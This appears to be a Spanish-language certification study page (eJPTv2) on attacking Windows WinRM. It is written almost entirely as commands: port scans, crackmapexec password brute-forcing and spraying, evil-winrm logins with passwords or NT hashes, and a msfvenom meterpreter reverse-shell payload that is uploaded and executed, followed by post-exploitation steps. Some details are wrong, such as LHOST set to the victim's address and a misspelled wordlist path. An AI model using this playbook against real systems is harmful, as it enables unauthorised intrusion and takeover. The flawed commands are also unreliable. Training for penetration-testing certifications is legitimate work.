---
layout: default
title: Preparación EJPTv2
---


## WinRM 🌐

Windows Remote Management (WinRM) es un servicio de administración remota que utiliza el protocolo WS-Management. Opera por defecto en los puertos 5985 (HTTP) y 5986 (HTTPS).

## Reconocimiento inicial

- Escaneo de puertos

```bash
nmap -p5985,5986 -sV <ip_victima>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <ip_victima>
```


- Verificación del servicio WinRM

```bash
crackmapexec winrm <ip_victima> -u administrator -p <password_wordlists.txt> # wordlists recomendado: usr/share/metasploit-framework/data/wordlists/unix_paswords.txt

crackmapexec winrm <ip_victima> -u <username> -p <password> -x "<comando_a_ejecutar>" # Cuando tengamos unas credenciales válidas
```

## Verificación del servicio

Herramientas principales para verificar la accesibilidad del servicio WinRM:

- Evil-WinRM: Herramienta especializada para conexiones WinRM

- CrackMapExec: Para verificar credenciales y acceso

- Impacket-WmiExec: Para ejecutar comandos remotos

## Explotación 

- Usando Evil-WinRM

```bash
# Conexión básica
evil-winrm -i <ip_victima> -u<username> -p <password>

# Conexión con hash NT
evil-winrm -i <ip_victima> -u<username> -H <NT-hash>

# Conexión SSL
evil-winrm -i <ip_victima> -u<username> -p <password> -S
```

- Usando CrackMapExec

```bash
# Prueba de credenciales
crackmapexec winrm <ip_victima> -u <username> -p <password>

# Password spraying
crackmapexec winrm <ip_victima> -u <username_wordlists> -p <password_wordlists.txt>
```

## Post-explotación

Una vez dentro del sistema, algunas acciones comunes:

- Enumeración de usuarios y grupos locales

- Búsqueda de archivos sensibles

- Elevación de privilegios

- Movimiento lateral


## Comandos útiles en sesión Evil-WinRM

```bash
# Enumeración básica
whoami /all
net user
systeminfo

# Carga de archivos
upload local_file.exe C:\\Windows\\Temp\\
download C:\\sensitive_file.txt

# Ejecución de scripts PowerShell
Invoke-PowerShellScript.ps1
```

## Obtener una sesión Meterpreter a través de WinRM

Para obtener una sesión Meterpreter usando WinRM, podemos seguir estos pasos:

- Configuración del payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_victima> LPORT=4444 -f exe -o <nombre_salida.exe>
```

- Configurar el handler en Metasploit

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ip_victima>
set LPORT 4444
run
```

- Subir y ejecutar el payload usando Evil-WinRM

```bash
# Conectar a WinRM
evil-winrm -i <ip_victima> -u <username> -p <password>

# En la sesión de Evil-WinRM
upload reverse.exe C:\\\\Windows\\\\Temp\\\\reverse.exe
start C:\\\\Windows\\\\Temp\\\\reverse.exe
```

- Comandos útiles en la sesión Meterpreter

```bash
getuid                    # Identificar usuario actual
sysinfo                   # Información del sistema
shell                     # Obtener shell cmd
load powershell          # Cargar extensión PowerShell
ps                       # Listar procesos
migrate <PID>            # Migrar a otro proceso
```

Este método combina WinRM para el acceso inicial y Meterpreter para post-explotación más avanzada, proporcionando mayor flexibilidad en las operaciones posteriores.

----
